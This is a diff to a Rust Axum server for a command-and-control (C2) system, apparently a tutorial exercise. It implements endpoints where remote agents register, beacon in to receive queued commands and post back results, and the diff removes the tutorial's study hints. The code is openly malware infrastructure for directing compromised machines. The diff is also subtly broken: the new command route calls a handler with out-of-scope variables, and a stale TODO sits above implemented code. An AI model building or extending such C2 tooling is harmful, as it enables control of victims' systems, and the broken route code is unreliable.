@@ -12,10 +12,7 @@ use std::{
     sync::{Arc, Mutex},
 };
 
-use crate::models::*;
-
-/// Type alias for our shared state
-type SharedState = Arc<Mutex<AppState>>;
+use crate::{SharedState, models::*};
 
 /// Start the C2 HTTP server
 pub async fn start_server() {
@@ -27,7 +24,10 @@ pub async fn start_server() {
         .route("/api/register", post(handle_register))
         .route("/api/beacon", post(handle_beacon))
         .route("/api/result", post(handle_result))
-        .route("/api/command",  method_router)
+        .route(
+            "/api/command",
+            post(queue_command(state, agent_id, command_type, payload)),
+        )
         // Future: Add more routes here
         .with_state(state);
 
@@ -41,19 +41,6 @@ pub async fn start_server() {
     axum::serve(listener, app).await.unwrap();
 }
 
-// ============================================================================
-// ENDPOINT 1: REGISTRATION (✅ FULLY IMPLEMENTED - STUDY THIS)
-// ============================================================================
-
-/// Handle agent registration
-///
-/// This is a COMPLETE implementation - study how it works!
-///
-/// **Key Concepts:**
-/// 1. `State(state)` - Extracts shared state from Axum
-/// 2. `Json(req)` - Deserializes JSON body into RegisterRequest
-/// 3. `state.lock().unwrap()` - Gets mutable access to shared data
-/// 4. We return `Json(response)` which Axum serializes to JSON
 async fn handle_register(
     State(state): State<SharedState>,
     Json(req): Json<RegisterRequest>,
@@ -99,23 +86,6 @@ async fn handle_register(
     })
 }
 
-// ============================================================================
-// ENDPOINT 2: BEACON (⚠️ PARTIALLY IMPLEMENTED - YOU FINISH THIS)
-// ============================================================================
-
-/// Handle agent beacon (check-in)
-///
-/// **YOUR TASK:**
-/// 1. Extract the agent_id from the request
-/// 2. Update the agent's last_seen timestamp
-/// 3. Get pending commands from the queue for this agent
-/// 4. Return the commands to the agent
-///
-/// **HINTS:**
-/// - Use `state.lock().unwrap()` to access state
-/// - Update: `state.agents.get_mut(&agent_id)`
-/// - Get commands: `state.command_queues.get_mut(&agent_id)`
-/// - Return: `Json(BeaconResponse { commands: vec })`
 async fn handle_beacon(
     State(state): State<SharedState>,
     Json(req): Json<BeaconRequest>,
@@ -135,13 +105,6 @@ async fn handle_beacon(
     }
 
     // TODO: Get pending commands from the queue
-    // HINT:
-    // let commands: Vec<Command> = if let Some(queue) = state.command_queues.get_mut(&req.agent_id) {
-    //     queue.drain(..).collect()  // This removes all commands from queue
-    // } else {
-    //     Vec::new()
-    // };
-
     let commands: Vec<Command> = if let Some(queue) = state.command_queues.get_mut(&req.agent_id) {
         queue.drain(..).collect()
     } else {
@@ -153,40 +116,11 @@ async fn handle_beacon(
     Json(BeaconResponse { commands })
 }
 
-// ============================================================================
-// ENDPOINT 3: RESULT (❌ NOT IMPLEMENTED - YOU IMPLEMENT THIS)
-// ============================================================================
-
-/// Handle command result from agent
-///
-/// **YOUR TASK:** Implement this completely!
-///
-/// **What it should do:**
-/// 1. Receive ResultRequest from agent
-/// 2. Create a CommandResult struct
-/// 3. Store it in state.results HashMap (key: command_id)
-/// 4. Print the result to console
-/// 5. Return success response
-///
-/// **SIGNATURE:**
-/// async fn handle_result(
-///     State(state): State<SharedState>,
-///     Json(req): Json<ResultRequest>,
-/// ) -> Json<ResultResponse>
-///
-/// **STEPS:**
-/// 1. Print "📨 Result received for command: {}"
-/// 2. Lock state
-/// 3. Create CommandResult { agent_id, command_id, success, output, timestamp }
-/// 4. Insert into state.results
-/// 5. Print the output
-/// 6. Return Json(ResultResponse { success: true })
 async fn handle_result(
     State(state): State<SharedState>,
     Json(req): Json<ResultRequest>,
 ) -> Json<ResultResponse> {
     // TODO: IMPLEMENT THIS FUNCTION
-    // Follow the same pattern as handle_register
 
     println!("📨 Result received for command: {}", req.command_id);
 
